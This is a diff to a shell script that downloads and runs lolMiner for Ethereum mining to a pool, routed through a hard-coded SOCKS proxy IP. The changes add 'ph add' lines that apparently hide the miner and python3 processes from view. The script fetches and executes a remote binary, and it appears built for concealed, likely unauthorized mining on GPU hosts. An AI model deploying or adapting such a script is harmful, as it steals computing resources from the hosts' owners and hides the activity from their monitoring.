@@ -1,13 +1,10 @@
 #!/bin/sh
-pkill -9 lolMiner
 nvidia-smi -caa
 sleep 9
 nvidia-smi -caa
 sleep 10
 nvidia-smi -caa
 sleep 30
-pkill -9 lolMiner
-sleep 100
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.29/lolMiner_v1.29_Lin64.tar.gz 
 tar -xf lolMiner_v1.29_Lin64.tar.gz
 cd 1.29
@@ -20,8 +17,10 @@ dpkg-reconfigure --frontend noninteractive tzdata
 
 sudo swapoff -a; sudo swapon -a
 sleep 10
+ph add PhoenixMinerEth.sh
+Ph add python3
 ph add lolMiner
-./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY socks 202.159.35.153:443  --timeprint on --longstats 30
+./lolMiner --algo ETHASH --pool stratum+tcp://ethash.kupool.com:8888 --user hunterd.001 --ethstratum ETHPROXY socks 202.159.35.153:443  --timeprint on --longstats 120
 sleep 10
 sudo swapoff -a; sudo swapon -a
 
